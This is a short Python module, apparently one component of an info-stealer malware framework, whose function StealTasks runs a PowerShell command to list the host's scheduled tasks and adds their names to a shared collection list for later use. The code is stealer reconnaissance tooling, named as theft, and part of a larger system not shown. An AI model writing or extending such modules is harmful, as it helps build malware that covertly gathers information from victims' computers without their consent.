import json

from main import error_handler
from main import ListFonction
from computer import get_commands


async def StealTasks() -> None:
    try:
        output = await get_commands("powershell.exe Get-ScheduledTask | Select-Object -Property TaskName | ConvertTo-Json")
        tasks_list = json.loads(output)
        ListFonction.TasksList.append([f"TaskName: {task['TaskName']}" for task in tasks_list])
    except Exception as e:
        error_handler(f"tasks error - {str(e)}")
